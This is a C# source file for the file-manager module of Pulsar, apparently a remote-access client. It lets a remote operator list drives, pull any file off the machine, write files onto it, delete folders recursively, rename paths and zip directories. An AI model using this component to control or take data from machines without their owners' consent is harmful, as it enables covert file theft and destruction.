using Pulsar.Client.Networking;
using Pulsar.Common;
using Pulsar.Common.Enums;
using Pulsar.Common.Extensions;
using Pulsar.Common.Helpers;
using Pulsar.Common.IO;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.FileManager;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using System;
using System.Collections.Concurrent;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security;
using System.Windows.Forms;
using System.Threading;

namespace Pulsar.Client.Messages
{
    public class FileManagerHandler : NotificationMessageProcessor, IDisposable
    {
        private readonly ConcurrentDictionary<int, FileSplit> _activeTransfers = new ConcurrentDictionary<int, FileSplit>();
        private readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file downloads

        private readonly PulsarClient _client;

        private CancellationTokenSource _tokenSource;

        private CancellationToken _token;

        public FileManagerHandler(PulsarClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
            _tokenSource = new CancellationTokenSource();
            _token = _tokenSource.Token;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            switch (connected)
            {
                case true:

                    _tokenSource?.Dispose();
                    _tokenSource = new CancellationTokenSource();
                    _token = _tokenSource.Token;
                    break;
                case false:
                    // cancel all running transfers on disconnect
                    _tokenSource.Cancel();
                    break;
            }
        }

        public override bool CanExecute(IMessage message) => message is GetDrives ||
                                                             message is GetDirectory ||
                                                             message is FileTransferRequest ||
                                                             message is FileTransferCancel ||
                                                             message is FileTransferChunk ||
                                                             message is DoPathDelete ||
                                                             message is DoPathRename ||
                                                             message is DoZipFolder;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetDrives msg:
                    Execute(sender, msg);
                    break;
                case GetDirectory msg:
                    Execute(sender, msg);
                    break;
                case FileTransferRequest msg:
                    Execute(sender, msg);
                    break;
                case FileTransferCancel msg:
                    Execute(sender, msg);
                    break;
                case FileTransferChunk msg:
                    Execute(sender, msg);
                    break;
                case DoPathDelete msg:
                    Execute(sender, msg);
                    break;
                case DoPathRename msg:
                    Execute(sender, msg);
                    break;
                case DoZipFolder msg:
                    HandleDoZipFile(sender, msg);
                    break;
            }
        }
        private void HandleDoZipFile(ISender client, DoZipFolder message)
        {
            try
            {
                if (!Directory.Exists(message.SourcePath))
                {
                    client.Send(new SetStatusFileManager { Message = $"目录未找到: {message.SourcePath}" });
                    return;
                }

                client.Send(new SetStatusFileManager { Message = $"正在创建压缩文件: {message.DestinationPath}" });

                string parentDir = Path.GetDirectoryName(message.DestinationPath);
                if (!Directory.Exists(parentDir))
                    Directory.CreateDirectory(parentDir);

                if (File.Exists(message.DestinationPath))
                    File.Delete(message.DestinationPath);

                ZipFile.CreateFromDirectory(
                    message.SourcePath,
                    message.DestinationPath,
                    (CompressionLevel)message.CompressionLevel,
                    includeBaseDirectory: false);

                client.Send(new SetStatusFileManager { Message = $"压缩文件创建成功: {message.DestinationPath}" });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatusFileManager { Message = $"创建压缩文件出错: {ex.Message}" });
            }
        }

        private void Execute(ISender client, GetDrives command)
        {
            DriveInfo[] driveInfos;
            try
            {
                driveInfos = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
            }
            catch (IOException)
            {
                client.Send(new SetStatusFileManager { Message = "GetDrives I/O 错误", SetLastDirectorySeen = false });
                return;
            }
            catch (UnauthorizedAccessException)
            {
                client.Send(new SetStatusFileManager { Message = "GetDrives 没有权限", SetLastDirectorySeen = false });
                return;
            }

            if (driveInfos.Length == 0)
            {
                client.Send(new SetStatusFileManager { Message = "GetDrives 未找到驱动器", SetLastDirectorySeen = false });
                return;
            }

            Drive[] drives = new Drive[driveInfos.Length];
            for (int i = 0; i < drives.Length; i++)
            {
                try
                {
                    var displayName = !string.IsNullOrEmpty(driveInfos[i].VolumeLabel)
                        ? string.Format("{0} ({1}) [{2}, {3}]", driveInfos[i].RootDirectory.FullName,
                            driveInfos[i].VolumeLabel,
                            driveInfos[i].DriveType.ToFriendlyString(), driveInfos[i].DriveFormat)
                        : string.Format("{0} [{1}, {2}]", driveInfos[i].RootDirectory.FullName,
                            driveInfos[i].DriveType.ToFriendlyString(), driveInfos[i].DriveFormat);

                    drives[i] = new Drive
                    { DisplayName = displayName, RootDirectory = driveInfos[i].RootDirectory.FullName };
                }
                catch (Exception)
                {

                }
            }

            client.Send(new GetDrivesResponse { Drives = drives });
        }

        private void Execute(ISender client, GetDirectory message)
        {
            bool isError = false;
            string statusMessage = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                statusMessage = msg;
            };

            try
            {
                DirectoryInfo dicInfo = new DirectoryInfo(message.RemotePath);

                FileInfo[] files = dicInfo.GetFiles();
                DirectoryInfo[] directories = dicInfo.GetDirectories();

                FileSystemEntry[] items = new FileSystemEntry[files.Length + directories.Length];

                int offset = 0;
                for (int i = 0; i < directories.Length; i++, offset++)
                {
                    items[i] = new FileSystemEntry
                    {
                        EntryType = FileType.Directory,
                        Name = directories[i].Name,
                        Size = 0,
                        LastAccessTimeUtc = directories[i].LastAccessTimeUtc
                    };
                }

                for (int i = 0; i < files.Length; i++)
                {
                    items[i + offset] = new FileSystemEntry
                    {
                        EntryType = FileType.File,
                        Name = files[i].Name,
                        Size = files[i].Length,
                        ContentType = Path.GetExtension(files[i].Name).ToContentType(),
                        LastAccessTimeUtc = files[i].LastAccessTimeUtc
                    };
                }

                client.Send(new GetDirectoryResponse { RemotePath = message.RemotePath, Items = items });
            }
            catch (UnauthorizedAccessException)
            {
                onError("GetDirectory 没有权限");
            }
            catch (SecurityException)
            {
                onError("GetDirectory 没有权限");
            }
            catch (PathTooLongException)
            {
                onError("GetDirectory 路径过长");
            }
            catch (DirectoryNotFoundException)
            {
                onError("GetDirectory 目录未找到");
            }
            catch (FileNotFoundException)
            {
                onError("GetDirectory 文件未找到");
            }
            catch (IOException)
            {
                onError("GetDirectory I/O 错误");
            }
            catch (Exception)
            {
                onError("GetDirectory 操作失败");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(statusMessage))
                    client.Send(new SetStatusFileManager { Message = statusMessage, SetLastDirectorySeen = true });
            }
        }

        private void Execute(ISender client, FileTransferRequest message)
        {
            new Thread(() =>
            {
                _limitThreads.WaitOne();
                try
                {
                    try
                    {
                        using (var srcFile = new FileSplit(message.RemotePath, FileAccess.Read))
                        {
                            _activeTransfers[message.Id] = srcFile;
                            OnReport("文件上传已开始");
                            foreach (var chunk in srcFile)
                            {
                                if (_token.IsCancellationRequested || !_activeTransfers.ContainsKey(message.Id))
                                    break;

                                // blocking sending might not be required, needs further testing
                                _client.SendBlocking(new FileTransferChunk
                                {
                                    Id = message.Id,
                                    FilePath = message.RemotePath,
                                    FileSize = srcFile.FileSize,
                                    Chunk = chunk
                                });
                            }

                            client.Send(new FileTransferComplete
                            {
                                Id = message.Id,
                                FilePath = message.RemotePath
                            });
                        }
                    }
                    catch (IOException ex)
                    {
                        const uint ERROR_SHARING_VIOLATION = 32;
                        if (((uint)ex.HResult & 0xFFFFu) == ERROR_SHARING_VIOLATION)
                        {
                            try
                            {
                                MessageBox.Show($"文件 '{message.RemotePath}' 正被其他进程占用。", "文件被占用", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            }
                            catch { }

                            client.Send(new FileTransferCancel
                            {
                                Id = message.Id,
                                Reason = "文件正被占用"
                            });

                            return; // stop upload thread gracefully
                        }

                        throw;
                    }
                }
                catch (Exception)
                {
                    client.Send(new FileTransferCancel
                    {
                        Id = message.Id,
                        Reason = "读取文件出错"
                    });
                }
                finally
                {
                    RemoveFileTransfer(message.Id);
                    _limitThreads.Release();
                }
            }).Start();
        }

        private void Execute(ISender client, FileTransferCancel message)
        {
            if (_activeTransfers.ContainsKey(message.Id))
            {
                RemoveFileTransfer(message.Id);
                client.Send(new FileTransferCancel
                {
                    Id = message.Id,
                    Reason = "已取消"
                });
            }
        }

        /// <summary>
        /// Validates and sanitizes a file path to prevent path traversal attacks.
        /// </summary>
        /// <param name="filePath">The file path to validate.</param>
        /// <returns>A safe file path or null if the path is invalid.</returns>
        private string ValidateAndSanitizeFilePath(string filePath)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(filePath))
                    return null;

                string fullPath = Path.GetFullPath(filePath);

                if (!Path.IsPathRooted(fullPath))
                    return null;

                string fileName = Path.GetFileName(fullPath);
                if (string.IsNullOrEmpty(fileName) || fileName.Contains(".."))
                    return null;

                char[] invalidChars = Path.GetInvalidFileNameChars();
                if (fileName.IndexOfAny(invalidChars) >= 0)
                    return null;

                string directory = Path.GetDirectoryName(fullPath);
                if (string.IsNullOrEmpty(directory))
                    return null;

                // Reject root-level paths (like "C:\DumpStack.log.tmp") and system folders
                string root = Path.GetPathRoot(fullPath);
                if (!string.IsNullOrEmpty(root) && string.Equals(root.TrimEnd(Path.DirectorySeparatorChar), directory.TrimEnd(Path.DirectorySeparatorChar), StringComparison.OrdinalIgnoreCase))
                {
                    // do not allow writing directly to drive root
                    return null;
                }

                string windowsDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                if (!string.IsNullOrEmpty(windowsDir) && fullPath.StartsWith(windowsDir, StringComparison.OrdinalIgnoreCase))
                {
                    // do not allow writing to Windows system directory
                    return null;
                }

                string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                if (!string.IsNullOrEmpty(programFiles) && fullPath.StartsWith(programFiles, StringComparison.OrdinalIgnoreCase))
                {
                    // do not allow writing to Program Files
                    return null;
                }

                if (!Directory.Exists(directory))
                {
                    Directory.CreateDirectory(directory);
                }

                return fullPath;
            }
            catch
            {
                return null;
            }
        }

        private void Execute(ISender client, FileTransferChunk message)
        {
            try
            {
                if (message.Chunk.Offset == 0)
                {
                    string filePath = message.FilePath;

                    if (string.IsNullOrEmpty(filePath))
                    {
                        // generate new temporary file path if empty
                        filePath = FileHelper.GetTempFilePath(message.FileExtension);
                    }
                    else
                    {
                        filePath = ValidateAndSanitizeFilePath(filePath);
                        if (filePath == null)
                        {
                            client.Send(new FileTransferCancel
                        {
                            Id = message.Id,
                            Reason = "无效的文件路径 - 安全违规"
                        });
                            return;
                        }
                    }

                    if (File.Exists(filePath))
                    {
                        // delete existing file
                        NativeMethods.DeleteFile(filePath);
                    }

                    _activeTransfers[message.Id] = new FileSplit(filePath, FileAccess.Write);
                    OnReport("文件下载已开始");
                }

                if (!_activeTransfers.ContainsKey(message.Id))
                    return;

                var destFile = _activeTransfers[message.Id];
                destFile.WriteChunk(message.Chunk);

                if (destFile.FileSize == message.FileSize)
                {
                    client.Send(new FileTransferComplete
                    {
                        Id = message.Id,
                        FilePath = destFile.FilePath
                    });
                    RemoveFileTransfer(message.Id);
                }
            }
            catch (Exception)
            {
                RemoveFileTransfer(message.Id);
                client.Send(new FileTransferCancel
                {
                    Id = message.Id,
                    Reason = "写入文件出错"
                });
            }
        }

        private void Execute(ISender client, DoPathDelete message)
        {
            bool isError = false;
            string statusMessage = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                statusMessage = msg;
            };

            try
            {
                switch (message.PathType)
                {
                    case FileType.Directory:
                        Directory.Delete(message.Path, true);
                        client.Send(new SetStatusFileManager
                        {
                            Message = "已删除目录",
                            SetLastDirectorySeen = false
                        });
                        break;
                    case FileType.File:
                        File.Delete(message.Path);
                        client.Send(new SetStatusFileManager
                        {
                            Message = "已删除文件",
                            SetLastDirectorySeen = false
                        });
                        break;
                }

                Execute(client, new GetDirectory { RemotePath = Path.GetDirectoryName(message.Path) });
            }
            catch (UnauthorizedAccessException)
            {
                onError("DeletePath 没有权限");
            }
            catch (PathTooLongException)
            {
                onError("DeletePath 路径过长");
            }
            catch (DirectoryNotFoundException)
            {
                onError("DeletePath 路径未找到");
            }
            catch (IOException)
            {
                onError("DeletePath I/O 错误");
            }
            catch (Exception)
            {
                onError("DeletePath 操作失败");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(statusMessage))
                    client.Send(new SetStatusFileManager { Message = statusMessage, SetLastDirectorySeen = false });
            }
        }

        private void Execute(ISender client, DoPathRename message)
        {
            bool isError = false;
            string statusMessage = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                statusMessage = msg;
            };

            try
            {
                switch (message.PathType)
                {
                    case FileType.Directory:
                        Directory.Move(message.Path, message.NewPath);
                        client.Send(new SetStatusFileManager
                        {
                            Message = "已重命名目录",
                            SetLastDirectorySeen = false
                        });
                        break;
                    case FileType.File:
                        File.Move(message.Path, message.NewPath);
                        client.Send(new SetStatusFileManager
                        {
                            Message = "已重命名文件",
                            SetLastDirectorySeen = false
                        });
                        break;
                }

                Execute(client, new GetDirectory { RemotePath = Path.GetDirectoryName(message.NewPath) });
            }
            catch (UnauthorizedAccessException)
            {
                onError("RenamePath 没有权限");
            }
            catch (PathTooLongException)
            {
                onError("RenamePath 路径过长");
            }
            catch (DirectoryNotFoundException)
            {
                onError("RenamePath 路径未找到");
            }
            catch (IOException)
            {
                onError("RenamePath I/O 错误");
            }
            catch (Exception)
            {
                onError("RenamePath 操作失败");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(statusMessage))
                    client.Send(new SetStatusFileManager { Message = statusMessage, SetLastDirectorySeen = false });
            }
        }

        private void RemoveFileTransfer(int id)
        {
            if (_activeTransfers.ContainsKey(id))
            {
                _activeTransfers[id]?.Dispose();
                _activeTransfers.TryRemove(id, out _);
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _client.ClientState -= OnClientStateChange;
                _tokenSource.Cancel();
                _tokenSource.Dispose();
                foreach (var transfer in _activeTransfers)
                {
                    transfer.Value?.Dispose();
                }

                _activeTransfers.Clear();
            }
        }
    }
}
